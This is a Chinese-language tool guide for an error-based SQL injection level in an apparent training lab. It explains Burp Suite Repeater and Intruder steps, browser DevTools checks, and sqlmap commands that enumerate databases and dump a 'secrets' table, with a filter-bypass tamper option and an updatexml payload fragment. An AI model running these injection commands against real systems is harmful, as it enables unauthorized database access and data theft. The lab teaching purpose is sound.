Burp Suite（手工验证首选）

适合逐条改 payload、观察报错原文，本关几乎全程用它就够了。

1. Proxy -> HTTP history 抓到 /modules/sqli/error.php?name=admin
2. 右键 Send to Repeater，把 name 参数改成报错 payload
3. Send 后看 Response：报错文本在 HTML 里，形如 XPATH syntax error: '~恭喜你完成本关挑战！'
4. 需要编码时用 Repeater 里的 Ctrl+U（URL 编码），或右键 Convert selection -> URL-encode
5. 分段读取时用 Intruder：把 substr 的起始位置设为 payload（Sniper，1..30）

本关解决什么：确认注入点、验证闭合与注释符是否正确、逐段读取被截断的数据。

sqlmap（自动化）

报错注入跑得最快，适合确认"是否有注入"以及直接导出数据。

# 只跑报错注入，导出通关凭证
sqlmap -u "{{SITE}}/modules/sqli/error.php?name=admin" --technique=E -D bafanglab -T secrets --dump --batch

# 先看有哪些库 / 表
sqlmap -u "{{SITE}}/modules/sqli/error.php?name=admin" --technique=E --dbs --batch
sqlmap -u "{{SITE}}/modules/sqli/error.php?name=admin" --technique=E -D bafanglab --tables --batch

# 常用参数
# --technique=E   只使用报错注入（B 布尔 / T 时间 / U UNION）
# --level=3 --risk=2  提高测试覆盖度
# --tamper=space2comment  空格被过滤时用注释替代空格

本关解决什么：不想手写 substr 分段时，让 sqlmap 自动完成长度探测与分段读取。

浏览器 DevTools

  • 地址栏直接粘贴 payload 就能验证（?name=' or updatexml(...)-- -）。
  • F12 → Network → 选中该请求 → Response 查看服务端返回的完整 HTML，报错信息就在里面。
  • Ctrl+F 在页面源码里搜 XPATH 或 error，快速定位报错位置。

本关解决什么：零安装快速试 payload、确认错误信息确实被回显。
